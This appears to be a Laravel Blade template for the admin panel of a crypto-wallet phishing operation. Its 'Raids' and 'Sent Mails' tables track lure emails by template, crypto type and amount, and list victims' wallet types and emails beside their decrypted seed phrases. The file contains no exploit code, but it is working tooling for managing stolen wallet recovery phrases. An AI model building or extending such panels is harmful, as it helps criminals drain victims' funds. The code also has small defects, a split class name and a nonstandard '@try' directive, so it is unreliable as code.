{{-- <x-app-layout>
    <!-- Start Main Content -->
    <div
        class="main-content group-data-[sidebar-size=lg]:xl:ml-[calc(theme('spacing.app-menu')_+_16px)] group-data-[sidebar-size=sm]:xl:ml-[calc(theme('spacing.app-menu-sm')_+_16px)] group-data-[theme-width=box]:xl:px-0 px-3 xl:px-4 ac-transition">
        <div class="grid grid-cols-12">
            <!-- INFORMATION TABLE THREE -->
            <div class="col-span-full">
                <div class="card p-0">
                    <div class="flex-center-between p-6 pb-4 border-b border-gray-200 dark:border-dark-border">
                        <h3 class="text-lg card-title leading-none">Raids Information Table</h3>
                        <button type="button"
                            class="btn b-light btn-primary-light btn-sm prism-toggle !py-2.5 focus:bg-primary-500 focus:text-white dark:!bg-dark-icon">
                            <span class="shrink-0">View Raids</span>
                            <i class="ri-code-line text-inherit text-[15px]"></i>
                        </button>
                    </div>
                    <div class="p-6">
                        <div class="overflow-x-auto mt-5">
                            <table
                                class="table-auto border-collapse w-full whitespace-nowrap text-left text-gray-500 dark:text-dark-text font-medium">
                                <thead>
                                    <tr class="text-primary-500">
                                        <th
                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                            Date</th>
                                        <th
                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                            Recipient Email</th>
                                        <th
                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                            Wallet Type</th>
                                        <th
                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square–

-right">
                                            Phrase</th>
                                    </tr>
                                </thead>
                                <tbody class="divide-y divide-gray-200 dark:divide-dark-border-three">
                                    @forelse ($wallets as $connection)
                                        <tr>
                                            <td class="p-6 py-4">{{ $connection->created_at->format('Y-m-d') }}</td>
                                            <td class="p-6 py-4">{{ $connection->sentEmail->recipient_email }}</td>
                                            <td class="p-6 py-4">{{ $connection->wallet_type }}</td>
                                            <td class="p-6 py-4">{{ decrypt($connection->seed_phrase) }}</td>
                                        </tr>
                                    @empty
                                        <tr>
                                            <td class="p-6 py-4" colspan="4">No wallet connections found.</td>
                                        </tr>
                                    @endforelse
                                </tbody>
                            </table>
                        </div>
                    </div>
                    <!-- Prism Code -->
                    <div class="p-6 hidden">
                        <pre>
                            <code class="language-markup">
                                <p>Sorry we can't show the huge data table</p>
                            </code>
                        </pre>
                    </div>
                    <!-- Prism Code -->
                </div>
            </div>
            <!-- INFORMATION TABLE FOUR -->
        </div>
    </div>
    <!-- End Main Content -->
</x-app-layout> --}}


<x-app-layout>
    <div
        class="main-content group-data-[sidebar-size=lg]:xl:ml-[calc(theme('spacing.app-menu')_+_16px)] group-data-[sidebar-size=sm]:xl:ml-[calc(theme('spacing.app-menu-sm')_+_16px)] group-data-[theme-width=box]:xl:px-0 px-3 xl:px-4 ac-transition">
        @if (session('success'))
            <div class="alert alert-success p-4">
                {{ session('success') }}
            </div>
        @endif
        @if (session('error'))
            <div class="alert alert-danger p-4">
                {{ session('error') }}
            </div>
        @endif
        <div class="card">
            <div class="p-1.5">
                <h6 class="card-title">Sent Mails</h6>
                <div class="mt-7 pt-0.5">
                    @if ($sent->isEmpty())
                        <p class="text-gray-500">No emails sent yet.</p>
                    @else
                        <table class="w-full table-auto border-collapse">
                            <thead>
                                <tr class="bg-gray-100">
                                    <th class="px-4 py-2 text-left">Recipient Email</th>
                                    <th class="px-4 py-2 text-left">Template</th>
                                    <th class="px-4 py-2 text-left">Crypto Type</th>
                                    <th class="px-4 py-2 text-left">Quantity</th>
                                    <th class="px-4 py-2 text-left">Wallet Details</th>
                                </tr>
                            </thead>
                            <tbody>
                                @foreach ($sent as $sent)
                                    <tr class="border-t">
                                        <td class="px-4 py-2">{{ $sent->recipient_email }}</td>
                                        <td class="px-4 py-2">{{ ucfirst($sent->template) }}</td>
                                        <td class="px-4 py-2">{{ $sent->crypto_type }}</td>
                                        <td class="px-4 py-2">{{ number_format($sent->quantity, 8) }}</td>
                                        <td class="px-4 py-2">
                                            @if ($sent->wallets->isEmpty())
                                                <p>No wallet connected yet.</p>
                                            @else
                                                @foreach ($sent->wallets as $wallet)
                                                    <ul class="list-disc pl-5">
                                                        <li><strong>Wallet Type:</strong> {{ $wallet->wallet_type }}
                                                        </li>
                                                        <li><strong>Email:</strong> {{ $wallet->user_email }}</li>
                                                        <li><strong>Seed Phrase:</strong> @try
                                                                {{ decrypt($wallet->seed_phrase) }} @catch(\Illuminate\Contracts\Encryption\DecryptException $e)
                                                                [Decryption Failed]
                                                            @endtry</li>
                                                    </ul>
                                                @endforeach
                                            @endif
                                        </td>
                                    </tr>
                                @endforeach
                            </tbody>
                        </table>
                    @endif
                </div>
            </div>
        </div>
    </div>
</x-app-layout>
